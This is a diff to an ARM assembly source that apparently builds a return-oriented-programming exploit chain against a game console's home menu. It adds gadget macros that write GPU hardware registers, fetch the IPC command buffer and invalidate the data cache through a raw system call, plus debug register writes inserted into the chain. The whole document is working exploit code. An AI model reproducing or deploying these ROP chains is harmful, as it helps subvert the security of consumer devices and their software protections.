@@ -15,6 +15,7 @@ MENU_NSS_LAUNCHTITLE equ ROP_MENU_NSS_LAUNCHTITLE ; r0 : out_ptr, r1 : unused ?,
 MENU_GSPGPU_RELEASERIGHT equ ROP_MENU_GSPGPU_RELEASERIGHT ; r0 : handle addr
 MENU_GSPGPU_ACQUIRERIGHT equ ROP_MENU_GSPGPU_ACQUIRERIGHT ; r0 : handle addr
 MENU_GSPGPU_FLUSHDATACACHE equ ROP_MENU_GSPGPU_FLUSHDATACACHE ; r0 : gsp handle ptr, r1 : process handle, r2 : address, r3 : size
+MENU_GSPGPU_WRITEHWREGS equ ROP_MENU_GSPGPU_WRITEHWREGS ; r0 : base reg, r1 : data ptr, r2 : data size
 MENU_GSPGPU_GXTRYENQUEUE equ ROP_MENU_GSPGPU_GXTRYENQUEUE ; r0 : interrupt receiver ptr, r1 : gx cmd data ptr
 MENU_MEMCPY equ ROP_MENU_MEMCPY ; r0 : dst, r1 : src, r2 : size
 
@@ -24,7 +25,7 @@ GPU_REG_BASE equ 0x1EB00000
 
 WAITLOOP_DST equ (MENU_LOADEDROP_BUFADR - (waitLoop_end - waitLoop_start))
 
-DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
+DUMMY_PTR equ (WAITLOOP_DST - 4)
 
 .macro set_lr,_lr
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
@@ -61,7 +62,7 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 .endmacro
 
 ; this memcpy's the size bytes that immediately preceed its call
-.macro memcpy_r0_lr_prev,size
+.macro memcpy_r0_lr_prev,size,skip
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word (MENU_OBJECT_LOC + (. - 4 - size) - object) ; r1 (src)
 	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
@@ -70,6 +71,9 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 		.word 0xDEADBABE ; r4 (garbage)
 		.word 0xDEADBABE ; r5 (garbage)
 		.word 0xDEADBABE ; r6 (garbage)
+	.if skip != 0
+		skip_0x84
+	.endif
 	.word MENU_MEMCPY
 .endmacro
 
@@ -223,6 +227,55 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 	.word MENU_GSPGPU_FLUSHDATACACHE
 .endmacro
 
+.macro writehwregs,reg,data,size
+	set_lr MENU_NOP
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+		.word reg ; r1 (reg base)
+	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
+		.word data ; r2 (data ptr)
+		.word size ; r3 (size)
+		.word 0xDEADBABE ; r4 (garbage)
+		.word 0xDEADBABE ; r5 (garbage)
+		.word 0xDEADBABE ; r6 (garbage)
+	.word MENU_GSPGPU_WRITEHWREGS
+.endmacro
+
+.macro writehwreg,reg,data
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		@@reg_data:
+			.word data ; r0 (just used to skip over data)
+	writehwregs reg, (MENU_OBJECT_LOC + @@reg_data - object), 0x4
+.endmacro
+
+.macro get_cmdbuf,offset
+	set_lr MENU_NOP
+	.word ROP_MENU_MRC_R0C13C03_ADD_R0R0x5C_BX_LR ; mrc 15, 0, r0, cr13, cr0, {3} ; add r0, r0, #0x5c ; bx lr
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+		.word (0x80+offset-0x5C) / 4 ; r1
+	.word ROP_MENU_ADD_R0R0R1LSL2_POP_R4PC ; add r0, r0, r1, lsl #2 ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
+.macro invalidate_dcache,addr,size
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
+		; nss_terminate_tid_cmd_buf:
+		.word 0x00090082 ; command header
+		.word addr ; address
+		.word size ; size
+		.word 0x00000000 ; size
+		.word 0xFFFF8001 ; process handle
+	memcpy_r0_lr_prev (4 * 5), 1
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
 .macro send_gx_cmd,cmd_data
 	set_lr MENU_NOP
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
@@ -291,6 +344,9 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 
 	object:
 	rop: ; real ROP starts here
+
+		; debug
+			writehwreg 0x202A04, 0x01FFFFFF
 
 		; send app parameter
 			apt_open_session 0
@@ -402,6 +458,7 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 				.word 0xBABEBAD0 ; marker
 				.word ROP_MENU_POP_R4R5PC ; rop gadget to replace pivot with
 			gsp_acquire_right
+			writehwreg 0x202A04, 0x01FF00FF
 			; todo : add cache invalidation for ropbin
 			sleep 500*1000*1000, 0x00000000
 	waitLoop_end:
